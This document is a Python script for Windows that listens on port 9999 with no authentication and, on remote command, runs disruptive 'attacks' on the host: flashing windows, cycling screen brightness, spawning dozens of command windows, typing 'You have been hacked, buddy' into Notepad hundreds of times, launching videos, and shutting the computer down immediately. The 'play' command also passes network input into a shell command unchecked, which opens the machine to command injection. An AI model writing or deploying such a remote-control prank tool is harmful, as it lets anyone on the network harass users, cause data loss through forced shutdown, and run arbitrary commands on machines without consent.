import socket
import subprocess
import time
import ctypes
import threading
import win32gui
import win32con
import pyautogui
import screen_brightness_control as sbc

# Global flag to stop attacks
stop_flag = False

def flash_screen():
    global stop_flag
    try:
        for _ in range(100):
            if stop_flag:
                break
            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
            time.sleep(0.1)
            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_SHOW)
            time.sleep(0.1)
    except Exception as e:
        print(f"Error in flash_screen: {e}")

def crazy_brightness():
    global stop_flag
    try:
        for _ in range(200):
            if stop_flag:
                break
            sbc.set_brightness(100)
            time.sleep(0.2)
            sbc.set_brightness(1)
            time.sleep(0.2)
    except Exception as e:
        print(f"Error in crazy_brightness: {e}")

def play_video(video_path):
    global stop_flag
    try:
        subprocess.run(f'start /MAX vlc "{video_path}"', shell=True)
    except Exception as e:
        print(f"Error playing video: {e}")

def lol_attack():
    global stop_flag
    try:
        subprocess.Popen("notepad.exe")
        time.sleep(1)
        for _ in range(500):
            if stop_flag:
                break
            pyautogui.typewrite("You have been hacked, buddy")
            pyautogui.press("enter")
    except Exception as e:
        print(f"Error in LOL attack: {e}")

def cli_hack():
    global stop_flag
    try:
        for _ in range(50):
            if stop_flag:
                break
            subprocess.Popen(['cmd.exe', '/c', 'start', 'cmd.exe', '/K', 'cd / && color a && tree'], shell=False)
            time.sleep(0.2)
    except Exception as e:
        print(f"Error in CLI Hack: {e}")

def stop_all():
    global stop_flag
    stop_flag = True
    print("[+] Stopping all hacks...")
    subprocess.run("taskkill /IM vlc.exe /F", shell=True)
    subprocess.run("taskkill /IM notepad.exe /F", shell=True)
    subprocess.run("taskkill /IM cmd.exe /F", shell=True)

def handle_client(client_socket):
    global stop_flag
    stop_flag = False  # Reset flag when a new connection is established
    try:
        print(f"[+] Connection from {client_socket.getpeername()}")

        while True:
            data = client_socket.recv(1024).decode().strip()
            if not data:
                break

            print(f"[+] Received: {data}")

            if data == "stopall":
                stop_all()
                break  

            elif data.startswith("play "):
                video_path = data.split(" ", 1)[1]
                threading.Thread(target=play_video, args=(video_path,)).start()

            elif data == "shutdown":
                subprocess.run("shutdown /s /t 0", shell=True)
                break  

            elif data == "lol":
                threading.Thread(target=lol_attack).start()

            elif data == "clihack":
                threading.Thread(target=cli_hack).start()

            elif data == "flashscreen":
                threading.Thread(target=flash_screen).start()

            elif data == "crazybrightness":
                threading.Thread(target=crazy_brightness).start()

    except Exception as e:
        print(f"Error handling client: {e}")

    finally:
        client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("[+] Listening on 0.0.0.0:9999")

    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket,)).start()

if __name__ == "__main__":
    start_server()
